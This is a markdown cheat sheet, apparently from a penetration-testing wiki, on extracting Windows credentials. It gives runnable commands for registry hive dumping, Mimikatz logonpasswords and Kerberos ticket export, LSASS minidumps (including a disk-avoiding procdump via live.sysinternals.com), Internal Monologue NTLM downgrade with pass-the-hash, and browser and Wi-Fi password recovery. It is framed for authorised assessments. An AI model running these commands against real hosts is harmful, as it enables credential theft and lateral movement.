# Windows Local Password Hash Processing Examples

These examples illustrate how **Windows local password hashes and credentials** may be processed during **authorized security assessments**, audits, or investigations.  
All techniques assume **explicit permission** and execution within an **approved engagement scope**.

Local credential material may exist in:

- Registry hives (SAM, SECURITY, SYSTEM)
    
- LSASS process memory
    
- Cached domain credentials
    
- Application- or user-level secret stores
    

The following sections outline common collection and extraction methods.

---

## CREDDUMP

**creddump** extracts local and cached credentials from offline registry hives.

Repository:  
[https://github.com/Neohapsis/creddump7](https://github.com/Neohapsis/creddump7)

Supported extraction modes:

- **cachedump** - cached domain credentials
    
- **lsadump** - LSA secrets
    
- **pwdump** - local account hashes
    

### Registry Hive Collection

Save required registry hives using `reg.exe`:

```cmd
C:\Windows\System32> reg.exe save HKLM\SAM sam_backup.hiv
C:\Windows\System32> reg.exe save HKLM\SECURITY sec_backup.hiv
C:\Windows\System32> reg.exe save HKLM\SYSTEM sys_backup.hiv
```

---

### Cached Credentials (CACHEDUMP)

Extract cached domain credentials:

```bash
cachedump.py <system hive> <security hive> <Vista/7=true|XP=false>
```

Examples:

```bash
cachedump.py sys_backup.hiv sec_backup.hiv true
cachedump.py sys_backup.hiv sec_backup.hiv false
```

---

### LSA Secrets (LSADUMP)

Extract secrets stored by the Local Security Authority:

```bash
lsadump.py <system hive> <security hive> <Vista/7=true|XP=false>
```

---

### Local Account Hashes (PWDUMP)

Extract local SAM account hashes:

```bash
pwdump.py <system hive> <sam hive> <Vista/7=true|XP=false>
```

---

## Meterpreter Hash Dump

Dump local SAM hashes during post-exploitation:

```bash
meterpreter> run post/windows/gather/hashdump
```

This method requires administrative privileges on the target host.

---

## MIMIKATZ

Mimikatz extracts credentials directly from memory, registry, and authentication subsystems.

Repositories:

- [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
    
- [https://github.com/gentilkiwi/mimikatz/wiki](https://github.com/gentilkiwi/mimikatz/wiki)
    

### Basic Execution Flow

```text
module::command [arguments]
```

### Common Workflow

Enable logging:

```text
mimikatz # log
```

Enable debug privileges:

```text
mimikatz # privilege::debug
```

Dump in-memory credentials:

```text
mimikatz # sekurlsa::logonpasswords full
```

Export Kerberos tickets:

```text
mimikatz # sekurlsa::tickets /export
```

Token manipulation:

```text
mimikatz # token::whoami
mimikatz # token::elevate
```

---

## Offline Mimikatz Techniques

### LSASS Memory Dump (Offline Analysis)

Dump LSASS memory for offline credential extraction.

PowerSploit reference:  
[https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

#### Workflow

Load PowerSploit:

```powershell
Import-Module PowerSploit
```

Dump LSASS:

```powershell
Get-Process lsass | Out-Minidump
```

Analyze dump offline:

```text
mimikatz "sekurlsa::minidump lsass_385.dmp"
mimikatz # sekurlsa::logonpasswords
```

---

### Registry-Based Extraction (Offline)

Save registry hives:

```cmd
reg.exe save HKLM\SAM sam_backup.hiv
reg.exe save HKLM\SECURITY sec_backup.hiv
reg.exe save HKLM\SYSTEM sys_backup.hiv
```

Extract credentials:

```text
mimikatz # lsadump::sam sys_backup.hiv sam_backup.hiv
```

---

## DPAPI Credential Recovery

DPAPI protects:

- Browser credentials
    
- Credential Manager entries
    
- RDP files
    
- Application secrets
    

DPAPI extraction is **context-dependent and complex**.

References:

- [https://github.com/gentilkiwi/mimikatz/wiki/module---dpapi](https://github.com/gentilkiwi/mimikatz/wiki/module---dpapi)
    
- [https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-userdpapi-abuse/](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-userdpapi-abuse/)
    
- [https://github.com/dfirfpi/dpapilab](https://github.com/dfirfpi/dpapilab)
    

---

## Internal Monologue (Local NTLM Capture)

Used when LSASS access is restricted by EDR or AV.

Repository:  
[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)

### Conceptual Flow

1. Temporarily adjust NTLM-related registry controls
    
2. Enumerate local logon tokens
    
3. Elicit NetNTLM responses via SSPI
    
4. Restore original configuration
    
5. Crack captured hashes
    
6. Perform Pass-the-Hash where applicable
    

### Execution

```bash
InternalMonologue -Downgrade True -Restore True -Impersonate True
```

Available options:

```text
Downgrade
Restore
Impersonate
Verbose
Challenge
```

---

## Remote LSASS Dump via Sysinternals

Avoid writing tools to disk by mounting Sysinternals live.

### Workflow

Map Sysinternals share:

```cmd
net use Z: \\live.sysinternals.com\tools\ "/user:"
```

Dump LSASS:

```cmd
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Analyze offline:

```text
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## Stored Wi-Fi Password Recovery

Repository:  
[https://github.com/jcwalker/WiFiProfileManagement](https://github.com/jcwalker/WiFiProfileManagement)

Dump cleartext Wi-Fi credentials:

```powershell
Get-WiFiProfile -ProfileName TestWiFi -ClearKey
```

---

## Browser Credential Extraction (SharpWeb)

Repository:  
[https://github.com/djhohnstein/SharpWeb](https://github.com/djhohnstein/SharpWeb)

Usage:

```bash
SharpWeb.exe chrome firefox edge
```

Supported browsers:

- Chrome
    
- Firefox
    
- Internet Explorer / Edge
    

---

## Common Application Password Locations

Reference:  
[https://securityxploded.com/passwordsecrets.php](https://securityxploded.com/passwordsecrets.php)

Includes credential storage locations for:

- Browsers
    
- FTP clients
    
- Email clients
    
- Messaging applications
    
- RDP tools
    
- Miscellaneous utilities
    

---

### Summary

Local credential material often persists **beyond user intent** and across:

- Memory
    
- Registry
    
- Configuration files
    
- Application stores
    

This page documents **where** those artifacts live and **how** they are commonly extracted during controlled security research and assessments.

If you want, next we can:

- Add **BH-style attack path tie-ins**
    
- Normalize these pages into a **single processing framework**
    
- Or refactor into **defender-focused detection & prevention notes**

[[Processing]]
[[Home]]

#howto #sudad